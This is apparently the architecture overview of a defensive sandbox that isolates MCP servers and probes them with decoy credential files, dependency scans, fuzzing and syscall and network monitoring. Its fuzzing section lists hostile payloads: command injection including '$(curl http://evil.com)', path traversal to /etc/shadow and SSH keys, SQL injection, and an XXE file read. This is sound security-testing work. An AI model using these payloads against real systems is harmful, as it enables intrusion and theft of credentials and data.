# Architecture Overview

## System Components

The MCP Malware Sandbox is built with a layered architecture that progressively analyzes MCP servers from static inspection to dynamic execution.

## Phase 1: Isolation Engine

### Docker + gVisor Runtime

The isolation engine creates a secure sandbox environment:

```
┌─────────────────────────────────────┐
│      Host Operating System          │
├─────────────────────────────────────┤
│         Docker Engine                │
├─────────────────────────────────────┤
│    gVisor Runtime (runsc)            │
│  ┌───────────────────────────────┐  │
│  │   Sandbox Container           │  │
│  │  ┌─────────────────────────┐  │  │
│  │  │  MCP Server Process     │  │  │
│  │  │  (Non-root user)        │  │  │
│  │  └─────────────────────────┘  │  │
│  │                               │  │
│  │  Fake Home Directory:         │  │
│  │  - /tmp/fake_home/.ssh        │  │
│  │  - /tmp/fake_home/.env        │  │
│  │  - /tmp/fake_home/.aws        │  │
│  └───────────────────────────────┘  │
└─────────────────────────────────────┘
```

**Key Features:**
- Non-shared kernel isolation via gVisor
- Read-only filesystem (except /tmp)
- Dropped Linux capabilities
- Honeypot decoy files
- Network isolation with logging

### Decoy Filesystem

The sandbox plants realistic-looking fake files to detect exfiltration:

```
/tmp/fake_home/
├── .ssh/
│   └── id_rsa          # Fake SSH private key
├── .env                # Fake environment variables
└── .aws/
    └── credentials     # Fake AWS credentials
```

If the MCP server attempts to read these files, it triggers a CRITICAL alert.

## Phase 2: Static & Dependency Analysis

### Trivy Scanner Integration

```
┌─────────────────────┐
│   MCP Server Code   │
└──────────┬──────────┘
           │
           ▼
    ┌──────────────┐
    │    Trivy     │
    │   Scanner    │
    └──────┬───────┘
           │
           ├─► Vulnerability Database
           │   (CVE Lookup)
           │
           ├─► SBOM Generation
           │   (CycloneDX format)
           │
           └─► JSON Report
               {
                 "vulnerabilities": [...],
                 "severity_counts": {...}
               }
```

### Permissions Manifest Analysis

Analyzes package files for suspicious capabilities:

**Node.js (package.json):**
- `child_process` - Command execution
- `fs` - Filesystem access
- `net` - Network operations

**Python (requirements.txt/pyproject.toml):**
- `subprocess` - Command execution
- `requests`/`httpx` - HTTP requests
- `paramiko` - SSH connections

## Phase 3: Dynamic Interrogation

### LLM Fuzzer Workflow

```
1. Tool Discovery
   ↓
   MCP Server → tools/list → {tools: [...]}

2. Payload Generation
   ↓
   Tool Schema → LLM/Manual Generator → [Payloads]

3. Attack Execution
   ↓
   For each payload:
   - Send to MCP server
   - Monitor response
   - Check for leaks
   - Log behavior

4. Results Analysis
   ↓
   - Data leaks detected?
   - Command execution?
   - Path traversal success?
```

### Attack Vectors

**Command Injection:**
```python
payloads = [
    "; ls -la",
    "| cat /etc/passwd",
    "&& whoami",
    "`id`",
    "$(curl http://evil.com)"
]
```

**Path Traversal:**
```python
payloads = [
    "../../../../etc/passwd",
    "../../../.ssh/id_rsa",
    "/etc/shadow"
]
```

**SQL Injection:**
```python
payloads = [
    "' OR '1'='1",
    "'; DROP TABLE users--",
    "admin'--"
]
```

## Phase 4: Behavioral Monitoring

### Multi-Layer Monitoring Stack

```
┌─────────────────────────────────────┐
│        Monitoring Layer              │
├─────────────────────────────────────┤
│  Network Monitor (tcpdump + iptables)│
│  - DNS queries logged                │
│  - Outbound IPs tracked              │
│  - PCAP file generation              │
├─────────────────────────────────────┤
│  Filesystem Monitor (strace)         │
│  - openat() syscalls                 │
│  - read()/write() tracking           │
│  - Decoy file access detection       │
├─────────────────────────────────────┤
│  Process Monitor (ps + execve)       │
│  - Process spawning                  │
│  - Shell execution (/bin/sh)         │
│  - Suspicious binaries (nc, curl)    │
└─────────────────────────────────────┘
```

### Event Types

```python
class EventType(Enum):
    FILESYSTEM = "filesystem"    # File access
    NETWORK = "network"          # Network activity
    PROCESS = "process"          # Process execution
    SYSCALL = "syscall"          # System calls
```

### Alert Severity Levels

- **CRITICAL**: Decoy file access, root exploit attempts
- **WARNING**: Unexpected network connections, suspicious processes
- **INFO**: Normal operations, logged for forensics

## Data Flow

```
Input: MCP Server Code
  │
  ├─► Phase 2: Static Scan
  │   ├─► Trivy → Vulnerabilities
  │   └─► Manifest → Permissions
  │
  ├─► Phase 1: Container Launch
  │   └─► Docker + gVisor → Isolated Environment
  │
  ├─► Phase 4: Monitoring Start
  │   ├─► Network Monitor
  │   ├─► Filesystem Monitor
  │   └─► Process Monitor
  │
  ├─► Phase 3: Fuzzing
  │   ├─► Discover Tools
  │   ├─► Generate Payloads
  │   └─► Execute Tests
  │
  └─► Phase 4: Monitoring Stop
      └─► Collect Events
  
Output: Comprehensive Report
  ├─► Vulnerability Report
  ├─► SBOM
  ├─► Fuzzing Results
  ├─► Behavioral Log
  └─► Risk Score + Recommendations
```

## Security Model

### Defense in Depth

1. **Container Isolation**: Prevents host compromise
2. **gVisor**: Prevents kernel exploits
3. **Read-only FS**: Prevents persistent malware
4. **Capability Dropping**: Limits what process can do
5. **Network Logging**: Detects C2 communications
6. **Honeypots**: Detects data exfiltration
7. **Process Monitoring**: Detects reverse shells

### Threat Coverage

| Threat | Detection Method | Severity |
|--------|------------------|----------|
| Data Exfiltration | Honeypot access | CRITICAL |
| Remote Code Execution | Process monitoring | CRITICAL |
| C2 Communication | Network monitoring | HIGH |
| Path Traversal | Fuzzing + FS monitor | HIGH |
| Dependency Vulnerabilities | Trivy scan | MEDIUM-CRITICAL |
| Privilege Escalation | gVisor + capabilities | HIGH |

## Performance Characteristics

- **Static Scan**: 10-60 seconds (depends on dependencies)
- **Container Launch**: 5-10 seconds
- **Fuzzing**: 30-300 seconds (depends on tool count)
- **Monitoring**: Continuous during execution
- **Total**: 1-6 minutes typical

## Extensibility

### Adding New Attack Vectors

```python
# In llm_fuzzer.py
def _generate_xxe_payloads(self, tool_schema):
    """Add XXE attack payloads."""
    return [
        FuzzPayload(
            attack_type=AttackType.XXE,
            payload={"xml": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>"},
            ...
        )
    ]
```

### Adding New Monitors

```python
# In behavior_monitor.py
def monitor_kernel_modules(self):
    """Monitor kernel module loading."""
    events = []
    # Check lsmod output
    # Log suspicious modules
    return events
```

## Future Enhancements

- [ ] eBPF-based monitoring for better performance
- [ ] GPU isolation for ML-based MCP servers
- [ ] Automated remediation suggestions
- [ ] Integration with CI/CD pipelines
- [ ] Real-time dashboard for monitoring
- [ ] Machine learning for anomaly detection
